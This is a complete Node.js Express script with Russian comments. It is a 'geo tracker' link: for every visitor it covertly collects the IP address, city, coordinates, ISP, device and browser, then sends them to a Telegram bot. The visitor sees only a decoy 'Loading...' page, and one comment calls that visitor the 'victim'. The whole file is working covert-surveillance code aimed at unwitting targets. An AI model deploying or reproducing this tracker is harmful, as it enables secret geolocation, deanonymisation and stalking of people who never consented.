const express = require('express');
const axios = require('axios');

const app = express();
const PORT = process.env.PORT || 3000;

const TELEGRAM_BOT_TOKEN = process.env.TOKEN;
const TELEGRAM_CHAT_ID = process.env.CHAT_ID;

function sendToTelegram(text) {
  if (!TELEGRAM_BOT_TOKEN) return;
  axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
    chat_id: TELEGRAM_CHAT_ID,
    text: text
  }).catch(e => console.log(e.message));
}

// Получение геоданных по IP
async function getGeo(ip) {
  try {
    const res = await axios.get(`http://ip-api.com/json/${ip}?fields=status,country,city,lat,lon,isp,org,query`);
    if (res.data.status === 'success') {
      return {
        country: res.data.country,
        city: res.data.city,
        lat: res.data.lat,
        lon: res.data.lon,
        isp: res.data.isp,
        org: res.data.org
      };
    }
  } catch (e) {}
  return null;
}

// Парсим User-Agent
function parseUA(ua) {
  let device = 'Unknown';
  let os = 'Unknown';
  let browser = 'Unknown';
  
  if (ua.includes('iPhone')) device = 'iPhone';
  else if (ua.includes('iPad')) device = 'iPad';
  else if (ua.includes('Android')) device = 'Android';
  else if (ua.includes('Windows')) device = 'Windows PC';
  else if (ua.includes('Macintosh')) device = 'Mac';
  
  if (ua.includes('Windows NT 10.0')) os = 'Windows 10';
  else if (ua.includes('Windows NT 6.1')) os = 'Windows 7';
  else if (ua.includes('Mac OS X')) os = 'macOS';
  else if (ua.includes('Android')) os = 'Android';
  else if (ua.includes('iPhone')) os = 'iOS';
  
  if (ua.includes('Chrome')) browser = 'Chrome';
  else if (ua.includes('Firefox')) browser = 'Firefox';
  else if (ua.includes('Safari') && !ua.includes('Chrome')) browser = 'Safari';
  else if (ua.includes('Edg')) browser = 'Edge';
  
  return { device, os, browser };
}

app.get('*', async (req, res) => {
  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || req.ip;
  const cleanIp = ip.replace('::ffff:', '');
  const ua = req.headers['user-agent'] || 'Unknown';
  const time = new Date().toLocaleString();
  
  const geo = await getGeo(cleanIp);
  const deviceInfo = parseUA(ua);
  
  let message = `📍 NEW VISIT\n`;
  message += `🕒 Time: ${time}\n`;
  message += `🌐 IP: ${cleanIp}\n`;
  
  if (geo) {
    message += `🗺️ Country: ${geo.country}\n`;
    message += `🏙️ City: ${geo.city}\n`;
    message += `📍 Coordinates: ${geo.lat}, ${geo.lon}\n`;
    message += `📡 ISP: ${geo.isp}\n`;
  } else {
    message += `🗺️ Geo: not available\n`;
  }
  
  message += `📱 Device: ${deviceInfo.device}\n`;
  message += `💻 OS: ${deviceInfo.os}\n`;
  message += `🌍 Browser: ${deviceInfo.browser}\n`;
  message += `🔗 User-Agent: ${ua.slice(0, 100)}`;
  
  sendToTelegram(message);
  
  // Отправляем пустую страницу (жертва видит только белый фон)
  res.send(`
    <!DOCTYPE html>
    <html>
    <head><title>Loading...</title><style>body{background:#0f0f0f;color:white;font-family:sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}</style></head>
    <body><div>Loading...</div></body>
    </html>
  `);
});

app.listen(PORT, () => console.log(`Geo tracker running on port ${PORT}`));
